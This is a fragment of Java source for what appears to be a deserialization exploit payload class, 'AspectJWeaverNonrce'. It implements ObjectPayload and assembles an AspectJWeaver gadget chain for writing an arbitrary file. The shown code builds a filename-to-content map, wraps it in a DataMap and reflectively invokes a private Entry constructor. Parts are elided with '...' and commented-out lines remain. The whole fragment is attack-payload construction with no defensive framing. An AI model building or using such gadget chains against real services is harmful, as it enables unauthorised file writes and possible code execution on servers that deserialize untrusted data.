...
public class AspectJWeaverNonrce implements ObjectPayload<Serializable> {
...
//        TiedMapEntry entry = new TiedMapEntry(lazyMap, filename);
        ...
        //String filename = "ajtest.ser";
        HashMap hashMap = new HashMap();
        //hashMap.put(filename, "content1".getBytes());
        hashMap.put(filename, content);
        DataMap dataMap = new DataMap(hashMap, (Map) obj);
        //dataMap.get(filename);
        //todo: check package
        Class clazz1 = Class.forName("checker.DataMap$Entry");
        Constructor constructor1 = clazz1.getDeclaredConstructors()[0];
        //System.out.println(constructor1);
        constructor1.setAccessible(true);
        Object obj1 = constructor1.newInstance(dataMap, filename);
        //
